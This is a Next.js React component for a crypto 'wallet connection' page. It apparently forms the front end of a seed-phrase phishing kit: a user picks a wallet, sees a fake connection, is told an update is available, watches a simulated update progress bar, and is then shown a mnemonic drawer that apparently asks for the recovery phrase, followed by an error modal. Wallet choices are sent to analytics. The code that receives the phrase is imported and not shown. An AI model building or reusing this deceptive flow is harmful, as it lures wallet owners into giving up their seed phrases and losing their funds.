"use client";

import { useState } from "react";
import { Card } from "@/components/ui/card";
import { WalletDetailsProps, WalletList } from "@/components/wallet-list";
import { WalletConnectionStatus } from "@/components/wallet-connection-status";
import { WalletUpdateDrawer } from "@/components/wallet-update-drawer";
import { MnemonicDrawer } from "@/components/mnemonic-drawer";
import { WalletUpdateAvailableDrawer } from "@/components/wallet-update-available-drawer";
import Image from "next/image";
import { ErrorModal } from "@/components/error-modal";
import { useAnalytics } from "@/hooks/use-analytics";

export default function WalletConnection() {
  const [selectedWallet, setSelectedWallet] =
    useState<WalletDetailsProps | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [showUpdateAvailableDrawer, setShowUpdateAvailableDrawer] =
    useState(false);
  const [showUpdateDrawer, setShowUpdateDrawer] = useState(false);
  const [updateProgress, setUpdateProgress] = useState(0);
  const [showMnemonicDrawer, setShowMnemonicDrawer] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  const { trackEvent } = useAnalytics();

  const handleWalletSelect = (wallet: WalletDetailsProps) => {
    // Track wallet selection
    trackEvent("wallet_select", { wallet: wallet.name });
    setSelectedWallet(wallet);
    setIsConnecting(true);
  };

  const handleUpdateStart = () => {
    setShowUpdateAvailableDrawer(false);
    setShowUpdateDrawer(true);
    setUpdateProgress(0);
  };

  const handleUpdateComplete = () => {
    setShowUpdateDrawer(false);
    setShowMnemonicDrawer(true);
  };

  const handleConnectionComplete = () => {
    setIsConnecting(false);
    setShowUpdateAvailableDrawer(true);
  };

  const handleFinalComplete = () => {
    setShowMnemonicDrawer(false);
    setSelectedWallet(null);
  };

  const handleMnemonicError = () => {
    setShowErrorModal(true);
  };

  const isAnyDrawerOpen =
    showUpdateAvailableDrawer ||
    showUpdateDrawer ||
    showMnemonicDrawer ||
    isConnecting;

  return (
    <div className="min-h-screen bg-linear-to-br from-blue-900 via-purple-900 to-indigo-900 flex items-center justify-center p-2 sm:p-4">
      <Card className="w-full max-w-6xl h-[calc(100vh-1rem)] sm:h-[600px] max-h-[800px] bg-black/40 backdrop-blur-sm border-gray-700 overflow-hidden relative">
        <div className="flex flex-col sm:flex-row h-full">
          <WalletList
            onWalletSelect={handleWalletSelect}
            disabled={isAnyDrawerOpen}
          />

          {/* Center Content */}
          <div className="flex-1 flex items-center justify-center relative p-4">
            <div className="text-center">
              <div className="text-2xl sm:text-4xl lg:text-6xl font-bold text-white/20 mb-2 sm:mb-4 tracking-wider break-all flex justify-center items-center">
                <Image
                  src="icons8-connect-100.png"
                  alt="Crypto"
                  width="80"
                  height="80"
                />
              </div>
              {!isConnecting &&
              !showMnemonicDrawer &&
              !showUpdateDrawer &&
              !showUpdateAvailableDrawer ? (
                <p className="text-gray-400 text-sm sm:text-lg">
                  Update your wallet to get started.
                </p>
              ) : (
                <p className="text-gray-400 text-sm sm:text-lg">
                  Please wait while your wallet is updating...
                </p>
              )}
            </div>
          </div>
        </div>

        {selectedWallet && (
          <WalletConnectionStatus
            isConnecting={isConnecting}
            selectedWallet={selectedWallet}
            onConnectionComplete={handleConnectionComplete}
          />
        )}

        {selectedWallet && (
          <WalletUpdateAvailableDrawer
            isOpen={showUpdateAvailableDrawer}
            onOpenChange={setShowUpdateAvailableDrawer}
            onUpdate={handleUpdateStart}
            selectedWallet={selectedWallet}
          />
        )}

        {selectedWallet && (
          <WalletUpdateDrawer
            isOpen={showUpdateDrawer}
            onOpenChange={setShowUpdateDrawer}
            progress={updateProgress}
            onProgressChange={setUpdateProgress}
            onComplete={handleUpdateComplete}
            selectedWallet={selectedWallet}
          />
        )}

        {selectedWallet && (
          <MnemonicDrawer
            isOpen={showMnemonicDrawer}
            onOpenChange={setShowMnemonicDrawer}
            onConfirm={handleFinalComplete}
            onError={handleMnemonicError}
            selectedWallet={selectedWallet}
          />
        )}
      </Card>
      {/* Add ErrorModal here */}
      <ErrorModal isOpen={showErrorModal} onOpenChange={setShowErrorModal} />
    </div>
  );
}
